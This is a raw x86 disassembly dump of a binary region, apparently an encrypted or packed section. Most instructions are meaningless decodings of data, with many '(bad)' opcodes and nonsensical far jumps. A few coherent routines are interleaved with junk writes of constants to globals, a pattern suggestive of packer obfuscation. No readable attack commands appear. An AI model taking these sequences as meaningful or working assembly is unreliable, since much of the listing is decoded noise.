  408a7b:	xchg   BYTE PTR [ebx],ch
  408a7d:	enter  0x7a44,0xd1
  408a81:	xor    bh,ah
  408a83:	addr16 hlt 
  408a85:	fidivr WORD PTR [esp+ebp*1]
  408a88:	cmp    ch,BYTE PTR [ecx-0x54]
  408a8b:	les    ecx,FWORD PTR [ecx-0x63]
  408a8e:	fadd   DWORD PTR [esi+edi*8]
  408a91:	cdq    
  408a92:	and    esp,DWORD PTR [eax]
  408a94:	outs   dx,DWORD PTR ds:[esi]
  408a95:	or     al,0x3f
  408a97:	test   ch,bh
  408a99:	or     BYTE PTR [ebx],ah
  408a9b:	fdivr  QWORD PTR [eax]
  408a9d:	repnz mov ds:0x85962bda,eax
  408aa3:	psubusw mm3,QWORD PTR [edi-0x71]
  408aa7:	mov    fs,WORD PTR [edi-0x38]
  408aaa:	mov    eax,0xb95d5bc9
  408aaf:	scas   al,BYTE PTR es:[edi]
  408ab0:	test   dl,bh
  408ab2:	dec    esi
  408ab3:	fimul  DWORD PTR [ecx-0x5afefdbb]
  408ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aba:	dec    ecx
  408abb:	pop    eax
  408abc:	(bad)  
  408abd:	cdq    
  408abe:	(bad)  
  408abf:	xor    al,0x8c
  408ac1:	imul   edi,DWORD PTR [ebp-0x175434a2],0xef491b77
  408acb:	js     0x408ab3
  408acd:	jmp    0x8c5bfc4b
  408ad2:	scas   eax,DWORD PTR es:[edi]
  408ad3:	addr16 (bad) 
  408ad5:	push   edx
  408ad7:	hlt    
  408ad8:	out    0x8c,al
  408ada:	sbb    ebx,DWORD PTR [ebp-0x49]
  408add:	adc    ah,BYTE PTR [esi-0x4524cf3]
  408ae3:	fisttp DWORD PTR [ebx+0x140ca2cd]
  408ae9:	enter  0x535c,0x90
  408aed:	fadd   st,st(6)
  408aef:	dec    edi
  408af0:	out    dx,al
  408af1:	clc    
  408af2:	inc    ecx
  408af3:	sub    DWORD PTR [edi+0x4c98f83e],ecx
  408af9:	sbb    ebx,DWORD PTR [ebp+0x71]
  408afc:	aam    0x91
  408afe:	inc    esi
  408aff:	adc    al,0x9c
  408b01:	cmp    al,0x4a
  408b03:	sti    
  408b04:	bound  edi,QWORD PTR [edi+eiz*8-0x20ef055c]
  408b0b:	ror    BYTE PTR [eax-0x35a421f6],0xfd
  408b12:	mov    eax,0x46d5642f
  408b17:	pop    ss
  408b18:	jae    0x408b38
  408b1a:	out    dx,eax
  408b1b:	pop    edi
  408b1c:	rcr    BYTE PTR [ecx+0x61],cl
  408b1f:	fisub  DWORD PTR [eax+0x1c2e4414]
  408b25:	lods   al,BYTE PTR ds:[esi]
  408b26:	mov    dl,0x8f
  408b28:	and    BYTE PTR [edx],0x3f
  408b2b:	imul   ebx,DWORD PTR cs:[ecx],0xffffffae
  408b2f:	jno    0x408ac4
  408b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b32:	or     eax,0x9a6e37ce
  408b37:	jecxz  0x408b48
  408b39:	fild   WORD PTR [edi+0x42b9b51d]
  408b3f:	int    0x75
  408b41:	loopne 0x408b9e
  408b43:	dec    eax
  408b44:	ret    0x246
  408b47:	adc    DWORD PTR [ecx-0xac754ab],eax
  408b4d:	jecxz  0x408bab
  408b4f:	lock inc BYTE PTR [esi-0x77]
  408b53:	scas   al,BYTE PTR es:[edi]
  408b54:	ds xchg ebx,eax
  408b56:	mov    eax,0x701a1895
  408b5b:	and    DWORD PTR [ecx+0x16],ecx
  408b5e:	punpckhdq mm0,mm7
  408b61:	imul   edx,DWORD PTR [eax+edi*8+0x5a],0xfffffff6
  408b66:	cli    
  408b67:	addr16 jge 0x408b97
  408b6a:	jae    0x408b6f
  408b6c:	jmp    0x408b87
  408b6e:	or     al,0xfd
  408b70:	pop    ds
  408b71:	popa   
  408b72:	lahf   
  408b73:	and    dh,bh
  408b75:	dec    esp
  408b76:	sub    al,0xcd
  408b78:	xor    edi,ebp
  408b7a:	mov    edi,0x89760b5c
  408b7f:	(bad)  
  408b80:	xchg   edx,eax
  408b81:	das    
  408b82:	addr16 data16 in al,0x28
  408b86:	cwde   
  408b87:	dec    edi
  408b88:	(bad)  
  408b89:	and    al,BYTE PTR [esi]
  408b8b:	mov    ds:0xb4d1fac5,eax
  408b90:	stos   BYTE PTR es:[edi],al
  408b91:	div    DWORD PTR [ebx+0x7cf94247]
  408b97:	loope  0x408c01
  408b99:	jnp    0x408b61
  408b9b:	and    DWORD PTR [edx+0x67239080],ecx
  408ba1:	pop    esi
  408ba2:	sub    DWORD PTR [esi+edi*2-0x32b336ec],0xd
  408baa:	cmp    BYTE PTR [edi-0x122ada91],dh
  408bb0:	or     ah,BYTE PTR [esi]
  408bb2:	gs jne 0x408b83
  408bb5:	cwde   
  408bb6:	or     DWORD PTR [esi],edi
  408bb8:	push   0x57
  408bba:	call   0x5a4a:0x3e03dd04
  408bc1:	in     eax,dx
  408bc2:	add    eax,DWORD PTR [eax-0x24]
  408bc5:	fs leave 
  408bc7:	ds jae 0x408b90
  408bca:	pop    esp
  408bcb:	dec    esp
  408bcc:	enter  0x3851,0xa2
  408bd0:	sbb    dl,BYTE PTR [ecx-0x3e]
  408bd3:	leave  
  408bd4:	test   al,0x49
  408bd6:	inc    eax
  408bd7:	push   ss
  408bd8:	dec    edx
  408bd9:	adc    esi,ebx
  408bdb:	retf   
  408bdc:	or     cl,BYTE PTR [edx-0x5c]
  408bdf:	nop
  408be0:	clc    
  408be1:	cmp    al,0x78
  408be3:	lods   eax,DWORD PTR ds:[esi]
  408be4:	shl    al,0x71
  408be7:	inc    edi
  408be8:	loop   0x408bde
  408bea:	lods   al,BYTE PTR ds:[esi]
  408beb:	sub    al,0x16
  408bed:	inc    edi
  408bee:	call   0xc3f8:0xc001f9f1
  408bf5:	stos   BYTE PTR es:[edi],al
  408bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf7:	jno    0x408c45
  408bf9:	retf   0x6f5d
  408bfc:	xchg   edx,eax
  408bfd:	pop    ecx
  408bfe:	cli    
  408bff:	fsincos 
  408c01:	(bad)  
  408c02:	in     eax,dx
  408c03:	psrlq  mm0,QWORD PTR [ebx]
  408c06:	(bad)  
  408c07:	sbb    cl,BYTE PTR [eax+0x4a0eacc1]
  408c0d:	iret   
  408c0e:	imul   ebp,DWORD PTR [ebp+0x3c],0x41
  408c12:	jge    0x408ba7
  408c14:	ins    DWORD PTR es:[edi],dx
  408c15:	mov    esi,0xe860b8d3
  408c1a:	hlt    
  408c1b:	sar    DWORD PTR [ebp+0x67],1
  408c1e:	push   edx
  408c1f:	retf   0x1bac
  408c22:	xor    DWORD PTR [eax+0x6a],ebp
  408c25:	(bad)  
  408c27:	repz jmp DWORD PTR [edi]
  408c2a:	sti    
  408c2b:	(bad)  
  408c2c:	in     al,dx
  408c2d:	jne    0x408c9a
  408c2f:	out    dx,eax
  408c30:	shr    edi,0x16
  408c33:	in     eax,dx
  408c34:	xchg   BYTE PTR [edi],dl
  408c36:	mov    esp,DWORD PTR [edx]
  408c38:	mov    esp,0x440797b1
  408c3d:	pusha  
  408c3e:	sbb    BYTE PTR [ebx+ebx*8+0x76],0xf7
  408c43:	repnz (bad) 
  408c47:	mov    esi,0x27023150
  408c4c:	ins    BYTE PTR es:[edi],dx
  408c4d:	ds pop ebx
  408c4f:	fld    TBYTE PTR [edx+0xf]
  408c52:	test   DWORD PTR [ecx+0x0],eax
  408c55:	add    BYTE PTR [eax],al
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x434743,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434707,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x434737,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x43466f,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x43477f,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x4346f7,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	xor    al,0xc8
  408ccb:	fidiv  DWORD PTR [ecx+0x7e7ee544]
  408cd1:	loope  0x408d4b
  408cd3:	jle    0x408d53
  408cd5:	add    eax,0xf35e8f1a
  408cda:	es stos DWORD PTR es:[edi],eax
  408cdc:	out    dx,eax
  408cdd:	sbb    eax,0xb41ab99e
  408ce2:	in     al,0x4d
  408ce4:	ja     0x408d48
  408ce6:	inc    eax
  408ce7:	mov    ebp,0xc3325a87
  408cec:	cli    
  408ced:	fnstsw WORD PTR [esi+ebx*2+0x14]
  408cf1:	gs stos DWORD PTR es:[edi],eax
  408cf3:	jmp    0x7dce:0x79237250
  408cfa:	push   eax
  408cfb:	out    dx,al
  408cfc:	dec    edx
  408cfd:	test   ebx,esi
  408cff:	sub    eax,0x53069209
  408d04:	ja     0x408d44
  408d06:	lock dec esi
  408d08:	sub    DWORD PTR [esp+edi*8],0x1
  408d0c:	or     eax,0xf14bc459
  408d11:	shl    DWORD PTR [ecx+eax*2],cl
  408d14:	cmp    ch,dl
  408d16:	jbe    0x408d2b
  408d18:	mov    gs,WORD PTR [edx-0x1fbb00aa]
  408d1e:	sar    DWORD PTR [edx+0x22],cl
  408d21:	cmc    
  408d22:	mov    al,ds:0x763d833f
  408d27:	aas    
  408d28:	gs xchg ecx,ebx
  408d2b:	into   
  408d2c:	ja     0x408d73
  408d2e:	jae    0x408cc0
  408d30:	(bad)  
  408d31:	xchg   esi,eax
  408d32:	shr    ah,cl
  408d34:	int3   
  408d35:	xchg   edx,eax
  408d36:	in     eax,0x15
  408d38:	test   BYTE PTR [edx-0x5f],dl
  408d3b:	(bad)  
  408d3c:	cmp    al,BYTE PTR [ebx]
  408d3e:	and    DWORD PTR [edi],esi
  408d40:	mov    esp,DWORD PTR [edi]
  408d42:	loopne 0x408ce6
  408d44:	cli    
  408d45:	pop    ds
  408d46:	fisubr WORD PTR gs:[ebx]
  408d49:	or     al,0xe5
  408d4b:	(bad)  
  408d4c:	fcomp  DWORD PTR fs:[esi+0x4e]
  408d50:	lods   al,BYTE PTR ds:[esi]
  408d51:	mov    edx,0xe6a4f556
  408d56:	(bad)
  408d5a:	push   ds
  408d5b:	dec    eax
  408d5c:	(bad)  
  408d5d:	pop    ecx
  408d5e:	sbb    al,0xe2
  408d60:	dec    ebx
  408d61:	sbb    ebx,0x9b555557
  408d67:	pop    esp
  408d68:	pop    edi
  408d69:	cmp    eax,0x25d96e34
  408d6e:	in     eax,0x4c
  408d70:	inc    esi
  408d71:	add    BYTE PTR [eax-0x7a3b4d2d],dl
  408d77:	xchg   ebp,eax
  408d78:	sar    DWORD PTR [ebp-0x41],1
  408d7b:	outs   dx,BYTE PTR ds:[esi]
  408d7c:	nop
  408d7d:	mov    DWORD PTR [ecx+0x53],ebx
  408d80:	(bad)
  408d83:	rcr    DWORD PTR [eax],0x5e
  408d86:	shr    BYTE PTR [edi+0x3c091334],cl
  408d8c:	xor    dh,BYTE PTR [edi]
  408d8e:	lock daa 
  408d90:	pop    ds
  408d91:	fsub   DWORD PTR [edi]
  408d93:	outs   dx,DWORD PTR ds:[esi]
  408d94:	loop   0x408d8e
  408d96:	test   BYTE PTR [edi],cl
  408d98:	movd   mm0,DWORD PTR [esi-0x5e]
  408d9c:	xchg   DWORD PTR [edx+ebx*4+0x5c891cd4],ebx
  408da3:	fdiv   DWORD PTR [ebp+0xc526008]
  408da9:	mov    eax,0xaa93f76d
  408dae:	adc    esp,DWORD PTR [eax-0x4bca47a3]
  408db4:	mul    BYTE PTR [edi]
  408db6:	pop    edi
  408db7:	(bad)  
  408db8:	scas   eax,DWORD PTR es:[edi]
  408db9:	aas    
  408dba:	xor    eax,0x3907ca9e
  408dbf:	pop    eax
  408dc0:	(bad)  
  408dc1:	adc    eax,0x48d122d6
  408dc6:	dec    esi
  408dc7:	sbb    cl,BYTE PTR [esi+edi*2]
  408dca:	push   ebx
  408dcb:	mov    dl,0x4d
  408dcd:	cmc    
  408dce:	out    dx,eax
  408dcf:	push   esp
  408dd0:	les    esi,FWORD PTR [esi-0x53]
  408dd3:	jmp    0xef33ad83
  408dd8:	inc    esi
  408dd9:	mov    bl,0xf3
  408ddb:	jns    0x408da0
  408ddd:	gs jge 0x408e5d
  408de0:	jle    0x408e33
  408de2:	les    eax,FWORD PTR [edi]
  408de4:	test   DWORD PTR [edi-0x2c],ebp
  408de7:	mov    ds:0x3851e93d,eax
  408dec:	sbb    esi,DWORD PTR [edx+0x7a901367]
  408df2:	out    dx,al
  408df3:	mov    esi,0xf3312733
  408df8:	sbb    BYTE PTR [eax-0x3],ch
  408dfb:	mov    esp,0x12b70e6c
  408e00:	retf   
  408e01:	in     eax,0x43
  408e03:	lds    eax,FWORD PTR [eax]
  408e05:	in     eax,0xdd
  408e07:	jp     0x408e6f
  408e09:	and    BYTE PTR [esi-0xf7eec6e],0x57
  408e10:	mov    ah,0x4a
  408e12:	push   edi
  408e13:	pop    esp
  408e14:	repz pop ecx
  408e16:	data16 rol BYTE PTR [eax+ecx*1],cl
  408e1a:	jns    0x408e79
  408e1c:	loope  0x408d9f
  408e1e:	call   0xb0b811fc
  408e23:	dec    ebx
  408e24:	addr16 jmp 0x408e15
  408e27:	sbb    ebp,esi
  408e29:	and    al,0xed
  408e2b:	mov    DWORD PTR ds:0x63daeb1d,ebp
  408e31:	jp     0x408e07
  408e33:	mov    ebx,esi
  408e35:	dec    esp
  408e36:	mov    bh,0xb8
  408e38:	or     al,0x8a
  408e3a:	or     edx,DWORD PTR [ebx+0x4210feca]
  408e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e41:	(bad)  
  408e42:	call   0xa0846bcb
  408e47:	lds    esp,FWORD PTR [ebp-0x75]
  408e4a:	mov    DWORD PTR [edi+0x5e],esi
  408e4d:	xor    ch,BYTE PTR [ebx+0x3a]
  408e50:	lods   al,BYTE PTR ds:[esi]
  408e51:	in     al,0x65
  408e53:	cmp    al,0xb7
  408e55:	and    edx,edi
  408e57:	imul   BYTE PTR [esi+ebp*8]
  408e5a:	cmc    
  408e5b:	lahf   
  408e5c:	xchg   esi,eax
  408e5d:	pop    ss
  408e5e:	or     DWORD PTR [edx-0x40],esi
  408e61:	retf   
  408e62:	push   ss
  408e63:	push   edx
  408e64:	mov    al,ds:0x3bfe3d04
  408e69:	xlat   BYTE PTR ds:[ebx]
  408e6a:	imul   eax,DWORD PTR [edi],0x3f
  408e6d:	xchg   ebx,eax
  408e6e:	xchg   ebp,eax
  408e6f:	inc    ebp
  408e70:	stos   DWORD PTR es:[edi],eax
  408e71:	or     eax,esp
  408e73:	cli    
  408e74:	mov    WORD PTR [ebx-0x696f975a],ss
  408e7a:	out    dx,eax
  408e7b:	dec    ecx
  408e7c:	and    eax,0xf95acf12
  408e81:	inc    esi
  408e82:	aad    0xa6
  408e84:	ins    BYTE PTR es:[edi],dx
  408e85:	mov    es,WORD PTR [eax+0x33]
  408e88:	popa   
  408e89:	inc    ebx
  408e8a:	sbb    BYTE PTR [esp+edi*8-0x22824b88],dl
  408e91:	add    eax,0x6efcfdf2
  408e96:	pop    ds
  408e97:	sub    al,0x89
  408e99:	cmp    al,0xd9
  408e9b:	out    0xba,eax
  408e9d:	dec    ecx
  408e9e:	(bad)  
  408e9f:	clc    
  408ea0:	std    
  408ea1:	jecxz  0x408ee9
  408ea3:	push   ds
  408ea4:	into   
  408ea5:	lods   al,BYTE PTR ds:[esi]
  408ea6:	pop    ds
  408ea7:	jmp    0xa3bc:0x98d19ee9
  408eae:	sbb    esi,DWORD PTR [esi]
  408eb0:	jecxz  0x408e97
  408eb2:	out    0xf5,eax
  408eb4:	std    
  408eb5:	and    eax,0x47258c82
  408eba:	add    bh,0xcc
  408ebd:	inc    ebp
  408ebe:	in     eax,0x71
  408ec0:	pop    edi
  408ec1:	out    0xb1,eax
  408ec3:	retf   
  408ec4:	and    al,0xf3
  408ec6:	and    al,BYTE PTR [eax-0x629b0bdc]
  408ecc:	lods   eax,DWORD PTR ds:[esi]
  408ecd:	xchg   edi,eax
  408ece:	push   ds
  408ecf:	ret    0xcb69
  408ed2:	push   edx
  408ed3:	add    BYTE PTR [ebp-0x42],ch
  408ed6:	dec    esp
  408ed7:	(bad)  
  408ed8:	cld    
  408ed9:	ins    BYTE PTR es:[edi],dx
  408eda:	push   0x9b041995
  408edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee0:	or     al,0x23
  408ee2:	dec    ebx
  408ee3:	mov    bl,0x24
  408ee5:	pushf  
  408ee6:	rcr    BYTE PTR [esi],cl
  408ee8:	and    DWORD PTR [edx+0x2d],ebp
  408eeb:	jae    0x408eb4
  408eed:	adc    BYTE PTR [edi-0x7a],ah
  408ef0:	mov    dl,0x54
  408ef2:	stos   DWORD PTR es:[edi],eax
  408ef3:	cmc    
  408ef4:	leave  
  408ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ef6:	mov    esp,0xb52091fe
  408efb:	sbb    DWORD PTR ds:0x743e7e4f,ebp
  408f01:	ins    BYTE PTR es:[edi],dx
  408f02:	not    BYTE PTR [edx+0xdd38080]
  408f08:	fcomp  DWORD PTR [edx]
  408f0a:	sub    DWORD PTR [edi+0x3d],ebp
  408f0d:	jae    0x408f5b
  408f0f:	int3   
  408f10:	fcmovnbe st,st(6)
  408f12:	sbb    eax,0x48a796fe
  408f17:	les    ebp,FWORD PTR [esi]
  408f19:	push   ds
  408f1a:	out    0xee,eax
  408f1c:	mov    edx,esi
  408f1e:	cs jb  0x408f8b
  408f21:	jns    0x408f82
  408f23:	(bad)  
  408f25:	(bad)  [edi]
  408f27:	and    bl,BYTE PTR ds:0xc62b4564
  408f2d:	and    eax,0x85ee99b4
  408f32:	pop    ss
  408f33:	jmp    0x13bd39e3
  408f38:	neg    DWORD PTR [ebp-0x50]
  408f3b:	hlt    
  408f3c:	scas   al,BYTE PTR es:[edi]
  408f3d:	dec    ecx
  408f3e:	in     al,dx
  408f3f:	aaa    
  408f40:	and    DWORD PTR [ebp+0x8],0x0
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x434743,0x434703
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434783
  408f5a:	or     DWORD PTR ds:0x434743,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x43465f,0x4346cf
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x434747,0x4346c7
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x43466b
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x434737,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x43467f,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1+0x219f8f0b]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x40900b
  408fec:	sub    esp,eax
  408fee:	scas   eax,DWORD PTR es:[edi]
  408fef:	mov    ds:0x2d677f63,eax
  408ff4:	adc    DWORD PTR [eax-0x44f7578f],eax
  408ffa:	mov    esi,es
  408ffc:	fistp  DWORD PTR [edx]
  408ffe:	jmp    0x7632:0x5e7ff533
  409005:	sub    edi,eax
  409007:	pop    esp
  409008:	and    BYTE PTR [ecx+0x4b834db5],ah
  40900e:	pop    ecx
  40900f:	lea    esi,[ebp+0x15040a6d]
  409015:	sbb    eax,DWORD PTR [esp+eiz*2+0x78]
  409019:	test   BYTE PTR [eax+0x2ff0cebf],ch
  40901f:	xchg   edx,eax
  409020:	lahf   
  409021:	aas    
  409022:	fcom   QWORD PTR [eax+0x64]
  409025:	fs pushf 
  409027:	fnsave [ebp-0x345617aa]
  40902d:	ds (bad) 
  40902f:	stc    
  409030:	ret    0x648d
  409033:	cmp    bh,BYTE PTR [edi-0x138f64b7]
  409039:	xor    eax,DWORD PTR cs:[ebx]
  40903c:	in     eax,dx
  40903d:	jl     0x409020
  40903f:	cmp    bl,bl
  409041:	pop    es
  409042:	ins    DWORD PTR es:[edi],dx
  409043:	inc    esi
  409044:	dec    ebp
  409045:	jmp    0x5431:0xb81b4732
  40904c:	push   edi
  40904d:	rcl    BYTE PTR [ebx],1
  40904f:	push   esp
  409050:	or     dh,bh
  409052:	into   
  409053:	sbb    dl,BYTE PTR [edx]
  409055:	sti    
  409056:	and    bh,dl
  409058:	js     0x40904f
  40905a:	jmp    0x409026
  40905c:	and    BYTE PTR [ebx-0x4e6cf39f],ch
  409062:	or     ch,cl
  409064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409065:	loope  0x4090e3
  409067:	pop    ds
  409068:	mov    ecx,edi
  40906a:	inc    ebp
  40906b:	jb     0xa1258a11
  409071:	outs   dx,DWORD PTR ds:[esi]
  409072:	pop    esp
  409073:	jae    0x40908b
  409075:	xchg   DWORD PTR [ecx],esp
  409077:	test   BYTE PTR [eax+0x76],bh
  40907a:	xlat   BYTE PTR ds:[ebx]
  40907b:	xchg   DWORD PTR [edi],ebx
  40907d:	and    BYTE PTR [ebx+0x612c10ea],bl
  409083:	shr    BYTE PTR [esi],cl
  409085:	push   ebx
  409086:	jnp    0x4090af
  409088:	int3   
  409089:	mov    ah,0x53
  40908b:	fild   QWORD PTR [eax-0x6c]
  40908e:	cmp    DWORD PTR [ebx],ecx
  409090:	inc    ebx
  409091:	sub    al,bl
  409093:	jle    0x42df86d
  409099:	and    BYTE PTR cs:[edx],0xa6
  40909d:	repz call 0x8e30:0xb3982c1d
  4090a5:	push   ebp
  4090a6:	fldcw  WORD PTR [edi-0x22168dc1]
  4090ac:	jecxz  0x409047
  4090ae:	sub    al,0xed
  4090b0:	pop    ss
  4090b1:	cli    
  4090b2:	dec    edi
  4090b3:	arpl   si,cx
  4090b5:	daa    
  4090b6:	popa   
  4090b7:	cmp    cl,BYTE PTR [ebp+0x13]
  4090ba:	out    dx,eax
  4090bb:	shl    BYTE PTR [ebx+eax*2],1
  4090be:	jecxz  0x409123
  4090c0:	stos   BYTE PTR es:[edi],al
  4090c1:	adc    DWORD PTR [edi+eiz*1+0x392d48bb],ecx
  4090c8:	hlt    
  4090c9:	cmp    eax,0x73bc5ca8
  4090ce:	dec    eax
  4090cf:	jb     0x409090
  4090d1:	sub    dh,al
  4090d3:	dec    esi
  4090d4:	dec    ecx
  4090d5:	cmc    
  4090d6:	call   0x8ed85e84
  4090db:	shl    BYTE PTR [edx-0x15a07672],0xa0
  4090e2:	and    DWORD PTR [ecx],ebp
  4090e4:	in     al,dx
  4090e5:	and    dh,ch
  4090e7:	mov    esp,0xd1e05844
  4090ec:	adc    eax,0x93949446
  4090f1:	mov    cl,cl
  4090f3:	push   ecx
  4090f4:	mov    cs:0x313e4613,al
  4090fa:	es or  eax,0x895d9970
  409100:	scas   eax,DWORD PTR es:[edi]
  409101:	retf   
  409102:	clc    
  409103:	int3   
  409104:	add    BYTE PTR [edx-0x2d14e0c6],al
  40910a:	jmp    0x40914f
  40910c:	je     0x4090ac
  40910e:	stos   BYTE PTR es:[edi],al
  40910f:	or     ebx,DWORD PTR [edx-0x8f15273]
  409115:	sbb    BYTE PTR [ecx],0x7e
  409118:	mov    edi,0xa88b2c8c
  40911d:	leave  
  40911e:	inc    ebx
  40911f:	sbb    bh,BYTE PTR ds:0xf214aefe
  409125:	fs sahf 
  409127:	es in  eax,dx
  409129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40912a:	pop    ss
  40912b:	cmp    ch,BYTE PTR [ebx+eiz*8+0x682fbc8d]
  409132:	dec    ecx
  409133:	mov    ebp,0xc8b54085
  409138:	rcl    DWORD PTR [ebp-0x70],1
  40913b:	jne    0x409100
  40913d:	mov    gs,WORD PTR [edi]
  40913f:	ffree  st(2)
  409141:	call   0x29a0:0x48cecd71
  409148:	mov    eax,0x6a7c06f8
  40914d:	test   DWORD PTR [ebx+0x76dc3985],eax
  409153:	jmp    0x9503:0xb1a19a85
  40915a:	mov    bh,0xe6
  40915d:	xor    esp,DWORD PTR [edx]
  40915f:	cmp    al,0xc
  409161:	pop    esi
  409162:	push   ds
  409163:	fnstenv [eax]
  409165:	pop    esp
  409166:	sbb    ebx,ebp
  409168:	fidiv  WORD PTR [esi+0x50]
  40916b:	and    al,0xa3
  40916d:	out    0x10,eax
  40916f:	mov    ecx,0xa13c6c6f
  409174:	les    eax,FWORD PTR ds:0x2cf473f8
  40917a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917b:	dec    ebx
  40917c:	pcmpgtw mm5,mm4
  40917f:	and    esi,edi
  409181:	retf   
  409182:	scas   eax,DWORD PTR es:[edi]
  409183:	push   ebx
  409184:	jnp    0x409125
  409186:	jl     0x4091c8
  409188:	and    DWORD PTR [ebx+0x33b5cce4],edi
  40918e:	(bad)  
  40918f:	in     eax,dx
  409190:	push   cs
  409191:	mov    dl,0x70
  409193:	cmp    eax,0x969828b0
  409198:	lods   al,BYTE PTR ds:[esi]
  409199:	xor    cl,BYTE PTR [ebx-0x48]
  40919c:	ins    BYTE PTR es:[edi],dx
  40919d:	or     eax,0xd0e437e1
  4091a2:	or     dh,BYTE PTR [ebx+0x1c]
  4091a5:	mov    WORD PTR [eax+0x1f],cs
  4091a8:	call   0xe236afb8
  4091ad:	xchg   ebx,eax
  4091ae:	and    BYTE PTR [ebp+0x322fea1a],bl
  4091b4:	sbb    BYTE PTR [edx+eiz*4],al
  4091b7:	mov    edx,0xe5f87592
  4091bc:	sar    DWORD PTR [edi+0x7e],cl
  4091bf:	or     DWORD PTR [edi],ebx
  4091c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091c2:	ss (bad) 
  4091c4:	push   esp
  4091c5:	dec    edi
  4091c6:	(bad)  
  4091c7:	xor    BYTE PTR [edi],cl
  4091c9:	in     al,0xb2
  4091cb:	cmp    DWORD PTR [ecx+esi*2+0x2af6aa34],edi
  4091d2:	lods   eax,DWORD PTR ds:[esi]
  4091d3:	jne    0x409253
  4091d5:	push   es
  4091d6:	mov    eax,ds:0x26d2c75
  4091db:	pop    esp
  4091dc:	mov    ah,0xa5
  4091de:	sbb    DWORD PTR [eax-0x2707356c],ebp
  4091e4:	jb     0x409209
  4091e6:	adc    DWORD PTR [edx+0x3e],esp
  4091e9:	out    dx,al
  4091ea:	mov    ebp,0x44b77b0b
  4091ef:	nop
  4091f0:	mov    edx,0x9ffe2708
  4091f5:	push   ebp
  4091f6:	adc    ah,BYTE PTR [edi]
  4091f8:	push   edi
  4091f9:	fprem  
  4091fb:	mov    al,ds:0xbae477be
  409200:	mov    DWORD PTR [eax+0x31dc0da],edx
  409206:	mov    WORD PTR [edi-0x64],?
  409209:	sbb    dh,BYTE PTR [esi+0x54]
  40920c:	lods   al,BYTE PTR ds:[esi]
  40920d:	inc    eax
  40920e:	pop    edx
  40920f:	sub    ch,BYTE PTR [ecx]
  409211:	pop    ebx
  409212:	lds    esp,FWORD PTR [ecx-0x62eaef21]
  409218:	out    dx,al
  409219:	lds    esi,FWORD PTR ds:0xbf5e139a
  40921f:	mov    ds:0xc02971d4,eax
  409224:	stc    
  409225:	ret    
  409226:	pop    ds
  409227:	hlt    
  409228:	lahf   
  409229:	or     bh,bh
  40922b:	sar    DWORD PTR [eax-0x35],cl
  40922e:	stc    
  40922f:	std    
  409230:	push   esp
  409231:	mov    ecx,0xc47f3869
  409236:	pop    edi
  409237:	sub    ch,cl
  409239:	xor    eax,DWORD PTR [ebp-0xa281c8a]
  40923f:	(bad)  
  409240:	lods   al,BYTE PTR ds:[esi]
  409241:	pop    ebp
  409242:	add    eax,0x1fa1f6fb
  409247:	out    dx,eax
  409248:	jbe    0x409289
  40924a:	push   es
  40924b:	(bad)  
  40924c:	pop    edx
  40924d:	test   DWORD PTR [edi+0x62],edi
  409250:	sbb    ecx,DWORD PTR ds:0x6ddf79d9
  409256:	xor    eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
